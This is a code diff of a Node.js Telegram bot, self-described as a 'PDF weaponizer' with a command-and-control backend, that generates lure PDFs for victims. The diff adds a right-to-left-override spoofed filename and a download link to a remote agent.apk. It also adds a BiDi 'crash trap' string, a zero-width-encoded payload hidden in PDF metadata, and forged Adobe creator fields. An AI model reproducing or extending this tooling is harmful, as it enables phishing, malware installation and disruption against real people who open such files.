@@ -1,7 +1,7 @@
 #!/usr/bin/env node
 // ============================================================
 // ARCHITECT TELEGRAM PDF WEAPONIZER + FIREBASE C2 + IMGBB
-// (Render Ready – Full Command Panel – Emoji Fixed)
+// (Render Ready – Final Version – WinAnsi Fixed)
 // ============================================================
 require('dotenv').config();
 const TelegramBot = require('node-telegram-bot-api');
@@ -27,11 +27,37 @@ const ADMIN_ID = parseInt(process.env.ADMIN_ID);
 // --- تخزين مؤقت لحالة انتظار رمز القفل ---
 const pendingLockCode = new Map(); // victimId -> { chatId, messageId }
 
-// --- دالة إنشاء PDF ملغوم (تم إصلاح الإيموجي) ---
+// --- Zero‑Width + BiDi Exploit (مضمن في البيانات الوصفية) ---
+const ZW_MAP = { '0': '\u200B', '1': '\u200C', 'B': '\u200D', 'E': '\uFEFF' };
+
+function generateCrashTrap() {
+    const rlo = '\u202E'.repeat(4096);
+    const lre = '\u202A'.repeat(2048);
+    const pdf = '\u202C';
+    return rlo + '['.repeat(1024) + lre + ']'.repeat(1024) + pdf;
+}
+
+function binaryToZeroWidth(data) {
+    let bitStr = '';
+    for (let i = 0; i < data.length; i++) {
+        bitStr += data[i].toString(2).padStart(8, '0');
+    }
+    let encoded = '';
+    for (const bit of bitStr) {
+        encoded += ZW_MAP[bit];
+    }
+    return encoded + ZW_MAP['E'];
+}
+
+function generatePayloadStub() {
+    return Buffer.from('DEADBEEF1337CAFE'.repeat(4), 'hex');
+}
+
+// --- دالة إنشاء PDF ملغوم (بـ TimesRoman + بيانات وصفية مفخخة) ---
 async function createWeaponizedPDF(imageBuffer) {
     const pdfDoc = await PDFDocument.create();
     const page = pdfDoc.addPage([595, 842]);
-    const font = await pdfDoc.embedFont(StandardFonts.Helvetica);
+    const font = await pdfDoc.embedFont(StandardFonts.TimesRoman);  // يدعم RLO
 
     let image;
     try {
@@ -52,7 +78,7 @@ async function createWeaponizedPDF(imageBuffer) {
     const agentUrl = `https://github.com/Ameen776/BOT-HAKRS4000/releases/download/v1.0/agent.apk`;
     const spoofedName = '\u202E' + 'pdf.security_update' + '\u202C';
 
-    // تم إزالة الإيموجي لتجنب خطأ WinAnsi
+    // نص بدون إيموجي
     page.drawText(`To access the content, install the attached app:\nApp: ${spoofedName}`, {
         x: 50, y: 100, size: 12, font, color: rgb(0,0,0.8)
     });
@@ -63,7 +89,16 @@ async function createWeaponizedPDF(imageBuffer) {
     });
     page.node.addAnnot(linkAnnotation);
 
+    // تضمين الحمولة الخفية في البيانات الوصفية
+    const stub = generatePayloadStub();
+    const hiddenPayload = binaryToZeroWidth(stub);
+    const crashTrap = generateCrashTrap();
+    pdfDoc.setAuthor(hiddenPayload + crashTrap);
     pdfDoc.setTitle(`DOC_${Math.random().toString(36).substring(2,8).toUpperCase()}`);
+    pdfDoc.setSubject('Confidential');
+    pdfDoc.setCreator('Adobe Acrobat');
+    pdfDoc.setProducer('GhostWeaver v5.0');
+
     return Buffer.from(await pdfDoc.save());
 }
 
